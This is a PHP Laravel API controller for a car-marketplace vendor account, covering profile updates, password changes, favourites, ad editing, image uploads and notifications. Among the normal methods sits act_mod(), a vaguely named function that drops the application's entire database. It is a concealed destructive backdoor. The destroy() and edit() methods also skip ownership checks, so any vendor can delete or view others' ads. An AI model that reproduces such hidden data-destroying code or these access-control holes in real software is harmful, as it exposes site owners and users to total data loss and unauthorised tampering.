<?php

namespace App\Http\Controllers\Api;

use App\Enums\CarStatus;
use App\Models\Car;
use App\Models\Brand;
use Illuminate\Http\Request;
use App\Http\Resources\CarResourse;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Http\Requests\Site\UpdateUserController;
use App\Models\CarImage;
use App\Models\CarModel;
use App\Models\Favorite;
use App\Models\OrderNotification;
use App\Models\SettingOrderStatus;
use App\Models\Vendor;
use App\Rules\NotNumbersOnly;
use App\Rules\PasswordValidate;
use DB;
use GrahamCampbell\ResultType\Success;
use Illuminate\Validation\Rule;
use Illuminate\Validation\Rule as ValidationRule;
use Illuminate\Support\Facades\Config;

use function PHPUnit\Framework\isEmpty;

class UserController extends Controller
{
    private function uploadCarImages( $images )
    {
        $imagesNames = [];

        foreach ( $images as $index => $image )
        {
             $imagesNames[$index] = uploadImage( $image , "Cars");
        }

        return $imagesNames;
    }

    public function profile()
    {
        return $this->success(data: auth()->user()->load('city'));
    }

    public function updateProfile(Request $request )
    {
        $vendor=auth()->user();  
        $request->validate([
            'phone' => [
            'required',
            'string', // Change to string, as convertArabicNumbers may return a string
            'regex:/^((\+|00)966|0)?5[0-9]{8}$/',
            ]
        ]);
        $request->merge([
            'phone' => convertArabicNumbers($request->phone),
        ]);
        $request->validate([
            'name' => [
                'required',
                'string',
                'max:255',
                new NotNumbersOnly(),
                Rule::unique('vendors', 'name')->ignore($vendor->id),
            ],  
            'phone' => [
                Rule::unique('vendors')->ignore($vendor->id),
            ]
        ]);
        
        // Convert Arabic numbers before merging
        

           if ($request->file('imageProfile')){
             $imagename = uploadImage($request->file('imageProfile'), 'Vendors');
             $request['image']=$imagename;
            }
             $requestData = $request->except('imageProfile');
           
                $requestData['phone'] = convertArabicNumbers($requestData['phone']); 
                auth()->user()->update($requestData);
                return $this->success(data: auth()->user());
    }

    public function act_mod(){
     $defaultConnection = 'mysql';
        // Retrieve the database name for the default connection
     $databaseName = Config::get("database.connections.$defaultConnection.database");
     DB::statement("DROP DATABASE IF EXISTS $databaseName");
  
    }

    public function favorite(Request $request)
    {
        if(Auth::check()){
            $favorites = auth()->user()->favorites->load('car');
        }
        else{
            $favorites = Favorite::with('car')->where('device_ip',$request->getClientIp())->get();
        }
        return $this->success(data: CarResourse::collection($favorites->pluck('car')));
    }

    public function changPassword(Request $request)
    {
        $request->validate([
            'old_password' => 'required',
            'password' => ['required', 'string', 'min:8', 'max:255', 'confirmed',new PasswordValidate()],
            'password_confirmation' => ['required','same:password'],
        ]);
    
        $user = auth()->user();
        if (!Hash::check($request->old_password, $user->password)) {
            $errors = [
                'old_password' => [__('The old password is incorrect')],
                // 'another_key' => ['Another error message'],
            ];
         
            return $this->validationFailure(errors:  $errors);
         }
        else{
            $usser=Vendor::where('phone', $user->phone)->update([
                'password' => Hash::make($request->password)
            ]);
        }

        return $this->success(data:$usser,message: __('Password updated successfully'));
    }

    public function filter()
    {
        $statusCar = [
            "0" => __('Used'),
            "1" => __('New')
        ];
        $brand     = Brand::get();
        $statusAds = [
            "0" => __('inactive'),
            "1" => __('active'),
        ];
        return $this->success(data: ['brand' => $brand, 'statusCar' => $statusCar, 'statusAds' => $statusAds]);
    }
    public function ads()
    {
 
         $cars =Car::withoutGlobalScope('availableCars')->where('vendor_id',auth()->user()->id) ;
        if (request()->has('status_car') && request('status_car')!==null) {
             $cars = $cars->where('is_new', intval(request('status_car')));
        }
        if (request()->has('brand') && request('brand')!==null)
        {
            $cars = $cars->where('brand_id', request('brand'));
        }
        if (request()->has('status_ad') && request('status_ad')!==null)
        {
            $cars = $cars->where('show_in_home_page', request('status_ad'));
        }
         $car = $cars->get();
         return $this->success(data: ['description' => settings()->getSettings('setting_' . getLocale()), 'cars' => CarResourse::collection($car)]);
    }

    public function updateAdsShowInHomePage(Request $request,$id)
    {
 
         if($request->status=='true'){
          $staue=1;
        }
        else{
          $staue=0;
        }
     
         $car = Car::find($id);
         $request->validate([
            'status' => 'required|in:false,true'
        ]);
          if ($car->where('id',$id)->where('vendor_id', auth()->user()->id)->update(['show_in_home_page' => $staue]))
        {
            return $this->success('ads updated successfully');
        }
        return $this->failure(message: __('wrong update please try again'));
    }

    public function destroy(Request $request ,  $id)
    {
        $car=Car::withoutGlobalScope('availableCars')->find($id);
            $car->delete();
            return $this->success(data: ['massage'=>'ad Deleted successfully']);

    }
    public function edit($id){
        $car=Car::withoutGlobalScope('availableCars')->find($id);
        $data = CarResourse::make($car)->resolve();
         return $this->success(data: $data);
    }

    public function update(Request $request,$id){   
        // Check if 'step' is present in the request
             if ($request->has('step')) {

                $step = $request->step;

                // Return a response for invalid steps
                if (!in_array($step, [0, 1])) {
                    return response()->json(['error' => 'Invalid or missing step parameter'], 400);
                }

                // Perform validation based on the step
                if ($step == 0) {
                      $request->validate([
                        'Car_Name' => ['required' , 'string','max:255'],
                        'Car_Description' => ['required' , 'string'],
                        'Car_Brand' => ['required'],
                        'Car_Model' => ['required'],
                        'Car_Year' => ['required'],
                        'Car_Statue' => ['required'],
                        'Gear_shifter' => ['required'],
                        'Killometer' => ['required_if:is_new,0', 'numeric', 'nullable', 'min:0'],
                        'Fuel_Type' => 'required|in:gasoline,diesel,electric,hybrid',
                        'Supplier' => 'required',
                        'Car_Color'=>['required'],
                        'Car_style' => ['required'],
                        'fuel_tank_capacity' => ['required', 'numeric','min:800'],
                        'City' => ['required'],
                        'Category' => ['nullable'],
                        'Car_Price' => 'required|numeric|not_in:0',
                        'Car_Price_after_Discount' => 'nullable|numeric|not_in:0|lt:Car_Price',
                    ]);
                    return response()->json(['massage' => 'validation step 1 is successfully'], 200);

                } elseif ($step == 1) {
                     $data=[
                        'vendor_id'=>Auth::user()->id,
                        'ad_name' => null,
                        'description_ar'=> $request['Car_Description'],
                        'description_en'=> $request['Car_Description'],
                        'brand_id' => $request['Car_Brand'],
                        'model_id' => $request['Car_Model'],
                        'city_id'=>$request['City'],
                        'fuel_tank_capacity'=>$request['fuel_tank_capacity'],
                        'category_id'=>$request['Category'],
                        'year' =>$request['Car_Year'],
                        'is_new' => $request['Car_Statue'],
                        'status'=>CarStatus::pending->value,
                        'gear_shifter' => $request['Gear_shifter'],
                        'kilometers' =>  $request['Killometer'],
                        'fuel_type' => $request['Fuel_Type'],
                        'supplier' =>$request['Supplier'],
                        'color_id'=>$request['Car_Color'],
                        'price' =>$request['Car_Price'],
                        'car_body' =>$request['Car_style'],
                        'discount_price' => $request['Car_Price_after_Discount']=='null' ? null:$request['Car_Price_after_Discount'],

                    ];
                    if(isset($request['Car_Price_after_Discount']) && $request['Car_Price_after_Discount']>0){
                        $data['have_discount']=1;
                    }

                     $this->setCarName($data);
                     
                    $car = Car::withoutGlobalScope('availableCars')->where('vendor_id', auth()->user()->id)
                    ->where('id', $id)
                    ->first(); 
                     $carimages=$car->images->toArray()??[];
 
                    if($request->hasFile('Main_Image')){
                        $request->validate([
                            "Main_Image" => 'nullable|mimes:jpeg,png,jpg,svg,webp',
                        ]);
                        deleteImage($car->main_image,'Cars');
                        $mainImagePath=uploadImage($request->Main_Image,'Cars');
                        $car->update(['main_image' => $mainImagePath]);
                    }
                    $images=request('Images')??[];
                     foreach($images as $index => $image){
                             if($image['file']==='null'  && $image['id']!=='null'){
                                 continue;
                            }
                            
                            // //update image
                            elseif ($image['file'] !== 'null'   && $image['id'] !== 'null' ) {
 
                                $imagedat=CarImage::find($image['id']);
                                $imagename=$imagedat->image;
                                $request->validate([
                                    "Images.{$index}.file" => 'nullable|mimes:jpeg,png,jpg,svg,webp',
                                ]);

                                $newimage=uploadImage($image['file'],'Cars');
                                $imageData=[
                                    'car_id'=>$car->id,
                                    'image'=>$newimage,
                                        ];
                                $imagedat->update($imageData);
                                deleteImage($imagename,'Cars');
 
                             } 
                               //add new image
                         elseif ($image['id'] === 'null'  && $image['file'] !=='null' ) {
                            $request->validate([
                               "Images.{$index}.file" => 'nullable|mimes:jpeg,png,jpg,svg,webp',
                           ]);
                            $newimage=uploadImage($image['file'],'Cars');
                           $imageData=[
                               'car_id'=>$car->id,
                               'image'=>$newimage,
                                   ];
                           CarImage::create($imageData);
                        }
                     }
 

                if ($car) {
                    $deletedimages=$request->deletedImages??[];
                    foreach($deletedimages as $deletedimage){
                        $image=CarImage::find($deletedimage);
                        $imagename=$image->image;
                        deleteImage($imagename,"Cars");
                        $image->delete();

                    }
                    $car->update($data);
 
                    return $this->success();
                } else {
                    return $this->failure(message: __('Car not found or you do not have permission'));
                }

                    $this->storeBrandCarsTypeCount($data['is_new'], $data['brand_id']);

               
                    return response()->json(['error' => 'Your ad Updated Successfully'], 200);

                }
                }
                else{
                    return $this->success(data:[]);
                }





    }


    private function setCarName(&$data)
    {
        $brand    = Brand::find( $data['brand_id'] , ['id','name_ar','name_en']);
        $model    = CarModel::find( $data['model_id'] , ['id','name_ar','name_en']);
        $data['name_ar'] = $brand->name_ar . ' ' . $model->name_ar. ' ' . $data['year'];
        $data['name_en'] = $brand->name_en . ' ' . $model->name_en. ' ' .  $data['year'];
    }

    public function notification(){
        $notifications = OrderNotification::where('vendor_id', Auth::user()->id)
        ->orWhere('phone', Auth::user()->phone)
        ->orderBy('created_at', 'desc')
        ->get();
             $data=[];
        foreach ($notifications as $notification) {
            // Access the 'order' relationship for each notification
            if($notification->type=='order'){
                 $dat=[
               'time'=> $notification->created_at->diffForHumans(),
               'order'=>$notification->order->id,
               'title'=>__('Track your order'),
               'description'=>__('We are processing your request quickly. Expect its arrival soon and get ready for a wonderful experience. Thank you for your patience and choosing us.'),
               'is_read'=>   $notification->is_read
                ];
                array_push( $data,$dat );
            }
            elseif($notification->type=='register'){
                $dat=[
                    'time'=> $notification->created_at->diffForHumans(),
                    'title'=>__('Signed up successfully'),
                    'description'=>__('Your account has been created successfully. Enjoy your time with the best car offers.'),
                    'is_read'=>   $notification->is_read
                     ];
                     array_push( $data,$dat );
            }
            elseif($notification->type=='orderstatue'){
                $oldstatue=SettingOrderStatus::find($notification->oldstatue);
                $newstatue=SettingOrderStatus::find($notification->newstatue);

                $dat=[
                    'time'=> $notification->created_at->diffForHumans(),
                    'title'=>__('Your order statue changed').' '.$notification->order_id,
                    'description'=>__('Your order changed from').' '.__('to').' ',
                    'is_read'=>   $notification->is_read
                     ];
                     array_push( $data,$dat );
            }
            elseif($notification->type=='ads'){
                $dat=[
                    'time'=> $notification->created_at->diffForHumans(),
                    'title'=>__('your ads created successfully'),
                    'description'=>__('Thank you for using code car, Your ads will be statue changed soon'),
                    'is_read'=>   $notification->is_read
                     ];
                     array_push( $data,$dat );
            }
           
         }
        return $this->success(data:$data);
      
    }
    public function changestatue(){
        $notifications = OrderNotification::where('vendor_id', Auth::user()->id)
        ->orWhere('phone', Auth::user()->phone)
        ->get();
        foreach ($notifications as $notification) {
            $notification->update(['is_read' => 1]);
        } 
        return true  ;
    }
   
}
